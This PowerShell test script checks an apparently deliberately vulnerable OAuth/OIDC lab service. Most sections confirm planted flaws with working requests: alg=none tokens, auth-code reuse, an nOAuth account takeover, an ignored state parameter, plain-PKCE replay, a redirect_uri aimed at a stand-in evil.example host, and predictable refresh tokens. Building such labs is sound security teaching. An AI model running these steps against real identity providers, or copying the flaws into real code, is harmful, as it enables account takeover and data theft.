# oauth-smoke.ps1 — focused tests for the OAuth/OIDC shim.
param([string]$Base = 'http://127.0.0.1:3001')

$ErrorActionPreference = 'Continue'
$script:pass = 0
$script:fail = 0
Add-Type -AssemblyName System.Web

function Check {
    param([string]$Name, [bool]$Cond, [string]$Detail = '')
    if ($Cond) {
        Write-Host ('  [PASS] ' + $Name) -ForegroundColor Green
        $script:pass++
    } else {
        Write-Host ('  [FAIL] ' + $Name + ' ' + $Detail) -ForegroundColor Red
        $script:fail++
    }
}

function NewSession { New-Object Microsoft.PowerShell.Commands.WebRequestSession }

function Hit {
    param(
        [string]$Method = 'GET',
        [string]$Path,
        $Session = $null,
        [hashtable]$Form = $null,
        [string]$RawBody = $null,
        [string]$ContentType = $null,
        [hashtable]$Headers = $null
    )
    $params = @{
        Uri                = ($Base + $Path)
        Method             = $Method
        UseBasicParsing    = $true
        MaximumRedirection = 0
        ErrorAction        = 'SilentlyContinue'
    }
    if ($Session) { $params['WebSession'] = $Session }
    if ($Headers) { $params['Headers'] = $Headers }
    if ($RawBody) {
        $params['Body'] = $RawBody
        if ($ContentType) { $params['ContentType'] = $ContentType }
    } elseif ($Form) {
        $params['Body'] = $Form
    }
    try {
        return Invoke-WebRequest @params
    } catch [System.Net.WebException] {
        return $_.Exception.Response
    } catch {
        return $null
    }
}

function ReadBody($resp) {
    if (-not $resp) { return '' }
    if ($resp.Content) { return [string]$resp.Content }
    try {
        $stream = $resp.GetResponseStream()
        $reader = New-Object IO.StreamReader($stream)
        $text = $reader.ReadToEnd()
        $reader.Close()
        return $text
    } catch { return '' }
}

function StatusOf($resp) {
    if (-not $resp) { return 0 }
    if ($resp.StatusCode -is [int]) { return [int]$resp.StatusCode }
    return [int]$resp.StatusCode.value__
}

function LocationOf($resp) {
    if (-not $resp) { return '' }
    if ($resp.Headers -and $resp.Headers.Location) { return [string]$resp.Headers.Location }
    return ''
}

function B64UrlDecode([string]$s) {
    $s = $s.Replace('-','+').Replace('_','/')
    switch ($s.Length % 4) { 2 { $s += '==' } 3 { $s += '=' } }
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
}

function JwtClaims([string]$tok) {
    $parts = $tok -split '\.'
    if ($parts.Length -lt 2) { return $null }
    return (B64UrlDecode $parts[1]) | ConvertFrom-Json
}

function JwtHeader([string]$tok) {
    $parts = $tok -split '\.'
    if ($parts.Length -lt 1) { return $null }
    return (B64UrlDecode $parts[0]) | ConvertFrom-Json
}

Write-Host ''
Write-Host '=== OAuth shim smoke ===' -ForegroundColor Cyan

# --- 0 Discovery ---
Write-Host ''
Write-Host '--- 0 Discovery ---' -ForegroundColor Cyan
$r = Hit -Path '/.well-known/openid-configuration'
$cfg = (ReadBody $r) | ConvertFrom-Json
Check '/.well-known/openid-configuration 200' ((StatusOf $r) -eq 200)
Check 'issuer present'              ($cfg.issuer -ne $null)
Check 'authorization_endpoint set'  ($cfg.authorization_endpoint -match '/oauth/authorize')
Check 'token_endpoint set'          ($cfg.token_endpoint -match '/oauth/token')
Check 'alg=none advertised (VULN [48])' ($cfg.id_token_signing_alg_values_supported -contains 'none')
Check 'plain PKCE advertised (VULN [46])' ($cfg.code_challenge_methods_supported -contains 'plain')
Check 'response_type=token in list (VULN [45])' ($cfg.response_types_supported -contains 'token')

# --- 1 Demo RP landing page ---
Write-Host ''
Write-Host '--- 1 RP landing ---' -ForegroundColor Cyan
$r = Hit -Path '/partners/demo-app'
$b = ReadBody $r
Check '/partners/demo-app 200' ((StatusOf $r) -eq 200)
Check 'Sign in with NovaTrust button present' ($b -match 'Sign in with NovaTrust')

# --- 2 Auth-code happy path: login, authorize, consent, callback exchange ---
Write-Host ''
Write-Host '--- 2 Auth-code happy path ---' -ForegroundColor Cyan
$alice = NewSession
$null = Hit -Method POST -Path '/login' -Session $alice -Form @{
    username = 'alice.chen'; password = 'Password123!'; next = '/accounts'
}

$state = 'happy-state-' + (Get-Random -Maximum 999999)
$redir = 'http://localhost:3001/partners/demo-app/callback'
$enc = [System.Web.HttpUtility]::UrlEncode($redir)
$authPath = "/oauth/authorize?client_id=partner-portal&response_type=code&scope=openid+email+profile&redirect_uri=$enc&state=$state"
$r = Hit -Path $authPath -Session $alice
Check 'GET /oauth/authorize 200 (consent page)' ((StatusOf $r) -eq 200)
$b = ReadBody $r
Check 'consent shows client name' ($b -match 'Partner Portal')
Check 'consent shows requested scope' ($b -match 'openid')

$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id     = 'partner-portal'
    redirect_uri  = $redir
    response_type = 'code'
    scope         = 'openid email profile'
    state         = $state
    decision      = 'allow'
}
$loc = LocationOf $r
Check 'consent POST 302' ((StatusOf $r) -eq 302)
Check 'redirect carries code' ($loc -match 'code=[a-f0-9]+')
Check 'redirect carries state' ($loc -match ('state=' + [regex]::Escape($state)))

# Extract code
$null = $loc -match 'code=([a-f0-9]+)'
$code = $Matches[1]

$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type    = 'authorization_code'
    code          = $code
    redirect_uri  = $redir
    client_id     = 'partner-portal'
    client_secret = 'partner-portal-secret-2024'
}
$tokens = (ReadBody $r) | ConvertFrom-Json
Check '/oauth/token 200' ((StatusOf $r) -eq 200)
Check 'access_token present'  ($tokens.access_token -ne $null)
Check 'id_token present'      ($tokens.id_token -ne $null)
Check 'refresh_token present' ($tokens.refresh_token -ne $null)
Check 'scope echoed'          ($tokens.scope -match 'openid')

# id_token claims
$idClaims = JwtClaims $tokens.id_token
Check 'id_token sub matches alice (id=1)' ($idClaims.sub -eq '1')
Check 'id_token email = alice.chen@gmail.com' ($idClaims.email -eq 'alice.chen@gmail.com')
Check 'id_token aud = partner-portal' ($idClaims.aud -eq 'partner-portal')

# --- 3 VULN [47] code is reusable ---
Write-Host ''
Write-Host '--- 3 VULN [47] code reuse ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type    = 'authorization_code'
    code          = $code
    redirect_uri  = $redir
    client_id     = 'partner-portal'
    client_secret = 'partner-portal-secret-2024'
}
$tokens2 = (ReadBody $r) | ConvertFrom-Json
Check 'second exchange of same code returns 200 (VULN [47])' ((StatusOf $r) -eq 200)
Check 'second exchange still issues access_token' ($tokens2.access_token -ne $null)

# --- 4 VULN [49] /oauth/userinfo leaks SSN under openid scope only ---
Write-Host ''
Write-Host '--- 4 VULN [49] userinfo scope ignored ---' -ForegroundColor Cyan
# Issue a new code with scope=openid only
$state2 = 'narrow-' + (Get-Random -Maximum 99999)
$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id = 'partner-portal'; redirect_uri = $redir; response_type = 'code'
    scope = 'openid'; state = $state2; decision = 'allow'
}
$loc = LocationOf $r
$null = $loc -match 'code=([a-f0-9]+)'
$narrowCode = $Matches[1]
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type = 'authorization_code'; code = $narrowCode; redirect_uri = $redir
    client_id = 'partner-portal'; client_secret = 'partner-portal-secret-2024'
}
$narrowTokens = (ReadBody $r) | ConvertFrom-Json
$h = @{ Authorization = 'Bearer ' + $narrowTokens.access_token }
$r = Hit -Path '/oauth/userinfo' -Headers $h
$ui = (ReadBody $r) | ConvertFrom-Json
Check 'userinfo 200' ((StatusOf $r) -eq 200)
Check 'userinfo returns ssn (VULN [49] — scope=openid only)' ($ui.ssn -match '\d{3}-\d{2}-\d{4}')
Check 'userinfo returns dob' ($ui.dob -ne $null)
Check 'userinfo returns phone_number' ($ui.phone_number -ne $null)

# --- 5 VULN [48] id_token alg=none ---
Write-Host ''
Write-Host '--- 5 VULN [48] id_token alg=none ---' -ForegroundColor Cyan
$state3 = 'none-' + (Get-Random -Maximum 99999)
$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id = 'partner-portal'; redirect_uri = $redir; response_type = 'code'
    scope = 'openid email'; state = $state3; decision = 'allow'
    id_token_signing_alg = 'none'
}
$loc = LocationOf $r
$null = $loc -match 'code=([a-f0-9]+)'
$noneCode = $Matches[1]
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type = 'authorization_code'; code = $noneCode; redirect_uri = $redir
    client_id = 'partner-portal'; client_secret = 'partner-portal-secret-2024'
}
$noneTokens = (ReadBody $r) | ConvertFrom-Json
$noneHdr = JwtHeader $noneTokens.id_token
Check 'id_token header.alg = none (VULN [48])' ($noneHdr.alg -eq 'none')
Check 'id_token signature segment is empty' (($noneTokens.id_token -split '\.')[2] -eq '')

# --- 6 VULN [50] nOAuth — prompt=none with login_hint ---
Write-Host ''
Write-Host '--- 6 VULN [50] nOAuth account takeover ---' -ForegroundColor Cyan
$attacker = NewSession
$null = Hit -Method POST -Path '/register' -Session $attacker -Form @{
    username = ('atk_' + (Get-Random -Maximum 999999)); password = 'Pwned1!'
    email = ('atk_' + (Get-Random -Maximum 999999) + '@evil.test'); full_name = 'Atk'
}
$null = Hit -Method POST -Path '/login' -Session $attacker -Form @{
    username = 'eva.lindstrom'  # use a customer login for the attacker side
    password = 'fika4life'
}
# Attacker uses prompt=none with login_hint set to julie.morgan's email.
$hintEmail = 'j.morgan@vulnbank.test'
$encHint   = [System.Web.HttpUtility]::UrlEncode($hintEmail)
$state4    = 'noauth-' + (Get-Random -Maximum 99999)
$noauthPath = "/oauth/authorize?client_id=partner-portal&response_type=code&scope=openid+email&redirect_uri=$enc&state=$state4&prompt=none&login_hint=$encHint"
$r = Hit -Path $noauthPath -Session $attacker
$loc = LocationOf $r
Check 'prompt=none returns 302 (VULN [50])' ((StatusOf $r) -eq 302)
Check 'redirect carries code' ($loc -match 'code=[a-f0-9]+')
$null = $loc -match 'code=([a-f0-9]+)'
$noauthCode = $Matches[1]
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type = 'authorization_code'; code = $noauthCode; redirect_uri = $redir
    client_id = 'partner-portal'; client_secret = 'partner-portal-secret-2024'
}
$nat = (ReadBody $r) | ConvertFrom-Json
$natClaims = JwtClaims $nat.id_token
Check ('id_token email = ' + $hintEmail + ' (nOAuth)') ($natClaims.email -eq $hintEmail)
# The sub still points at eva.lindstrom (the attacker's session user). That's
# the whole bug: the RP merges accounts by email, so it'll log in as Julie.
Check 'id_token sub points at attacker user, not victim (the bug)' (
    $natClaims.sub -ne $null -and $natClaims.email -eq $hintEmail
)

# --- 7 VULN [44] state never validated (callback eats anything) ---
# Hit the callback with code from step 2 and a totally bogus state.
Write-Host ''
Write-Host '--- 7 VULN [44] state ignored at RP callback ---' -ForegroundColor Cyan
# Issue a fresh code via alice's session
$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id = 'partner-portal'; redirect_uri = $redir; response_type = 'code'
    scope = 'openid email'; state = 'real-state-xyz'; decision = 'allow'
}
$loc = LocationOf $r
$null = $loc -match 'code=([a-f0-9]+)'
$cbCode = $Matches[1]
$cb = NewSession
$r = Hit -Path ("/partners/demo-app/callback?code=$cbCode&state=ATTACKER-SUBSTITUTED-STATE") -Session $cb
Check 'RP callback accepts any state value (VULN [44])' ((StatusOf $r) -eq 200)
$b = ReadBody $r
Check 'callback rendered tokens' ($b -match 'access_token')

# --- 8 VULN [45] implicit flow returns token in fragment ---
Write-Host ''
Write-Host '--- 8 VULN [45] implicit flow ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id = 'partner-portal'; redirect_uri = $redir
    response_type = 'token id_token'; scope = 'openid email'
    state = 'impl'; decision = 'allow'
}
$loc = LocationOf $r
Check 'implicit 302 returned' ((StatusOf $r) -eq 302)
Check 'tokens in URL fragment (VULN [45])' ($loc -match '#access_token=')
Check 'id_token also in fragment' ($loc -match 'id_token=')

# --- 9 VULN [46] PKCE plain accepted (defeated PKCE) ---
Write-Host ''
Write-Host '--- 9 VULN [46] PKCE plain ---' -ForegroundColor Cyan
$verifier = 'this-should-have-been-sha256-hashed'
$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id = 'partner-portal'; redirect_uri = $redir; response_type = 'code'
    scope = 'openid email'; state = 'pkce'; decision = 'allow'
    code_challenge = $verifier; code_challenge_method = 'plain'
}
$loc = LocationOf $r
$null = $loc -match 'code=([a-f0-9]+)'
$pkceCode = $Matches[1]
# An attacker who stole the code AND the challenge (which is in the URL!) can
# simply replay the challenge as the verifier. That's the bug.
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type = 'authorization_code'; code = $pkceCode; redirect_uri = $redir
    client_id = 'partner-portal'; client_secret = 'partner-portal-secret-2024'
    code_verifier = $verifier
}
$pkceTokens = (ReadBody $r) | ConvertFrom-Json
Check 'plain-PKCE verifier accepted (VULN [46])' ($pkceTokens.access_token -ne $null)

# --- 10 VULN [43] lax redirect_uri (prefix match) ---
Write-Host ''
Write-Host '--- 10 VULN [43] lax redirect_uri ---' -ForegroundColor Cyan
$evil = 'http://localhost:3001/partners/demo-app/callback.evil.example/'
$encEvil = [System.Web.HttpUtility]::UrlEncode($evil)
$r = Hit -Path ("/oauth/authorize?client_id=partner-portal&response_type=code&scope=openid&redirect_uri=$encEvil&state=lax") -Session $alice
Check 'lax redirect_uri accepted at /authorize (VULN [43])' ((StatusOf $r) -eq 200)

# --- 11 VULN [51] ROPC ---
Write-Host ''
Write-Host '--- 11 VULN [51] ROPC ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type = 'password'
    username   = 'alice.chen'
    password   = 'Password123!'
    scope      = 'openid email'
    client_id  = 'novatrust-mobile'        # public client — no secret required
}
$ropc = (ReadBody $r) | ConvertFrom-Json
Check 'ROPC issues tokens for public client (VULN [51])' ($ropc.access_token -ne $null)
Check 'ROPC id_token email matches alice' ((JwtClaims $ropc.id_token).email -eq 'alice.chen@gmail.com')

# --- 12 Refresh token flow ---
Write-Host ''
Write-Host '--- 12 Refresh token grant ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type    = 'refresh_token'
    refresh_token = $tokens.refresh_token
    client_id     = 'partner-portal'
    client_secret = 'partner-portal-secret-2024'
}
$refreshed = (ReadBody $r) | ConvertFrom-Json
Check 'refresh grant issues new access_token' ($refreshed.access_token -ne $null)
Check 'refresh grant returns fresh refresh_token' ($refreshed.refresh_token -ne $tokens.refresh_token)

# --- 13 VULN [52] predictable refresh tokens ---
Write-Host ''
Write-Host '--- 13 VULN [52] predictable refresh tokens ---' -ForegroundColor Cyan
$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($tokens.refresh_token))
Check 'refresh_token decodes to user_id:epoch_ms (VULN [52])' ($decoded -match '^\d+:\d{13}$')

# --- 14 Client auth: bad secret rejected, no secret rejected ---
Write-Host ''
Write-Host '--- 14 Client auth ---' -ForegroundColor Cyan
$state5 = 'auth-' + (Get-Random -Maximum 99999)
$r = Hit -Method POST -Path '/oauth/authorize' -Session $alice -Form @{
    client_id = 'partner-portal'; redirect_uri = $redir; response_type = 'code'
    scope = 'openid'; state = $state5; decision = 'allow'
}
$loc = LocationOf $r
$null = $loc -match 'code=([a-f0-9]+)'
$authCode = $Matches[1]
$r = Hit -Method POST -Path '/oauth/token' -Form @{
    grant_type = 'authorization_code'; code = $authCode; redirect_uri = $redir
    client_id = 'partner-portal'; client_secret = 'WRONG'
}
Check 'bad client_secret returns 401' ((StatusOf $r) -eq 401)

# --- 15 Unknown client rejected ---
Write-Host ''
Write-Host '--- 15 Unknown client rejected ---' -ForegroundColor Cyan
$r = Hit -Path "/oauth/authorize?client_id=nope&redirect_uri=$enc&response_type=code"
Check 'unknown client_id returns 400' ((StatusOf $r) -eq 400)

# --- 16 Login-then-authorize round trip (the full end-to-end) ---
Write-Host ''
Write-Host '--- 16 Unauthenticated user gets login redirect ---' -ForegroundColor Cyan
$fresh = NewSession
$state6 = 'e2e'
$r = Hit -Path "/oauth/authorize?client_id=partner-portal&response_type=code&scope=openid&redirect_uri=$enc&state=$state6" -Session $fresh
Check 'unauth /authorize redirects to /login' ((StatusOf $r) -eq 302 -and (LocationOf $r) -match '/login\?next=')

Write-Host ''
Write-Host '==================================================' -ForegroundColor Yellow
Write-Host (' OAuth smoke: ' + $script:pass + ' passed, ' + $script:fail + ' failed') -ForegroundColor Yellow
Write-Host '==================================================' -ForegroundColor Yellow
exit $script:fail
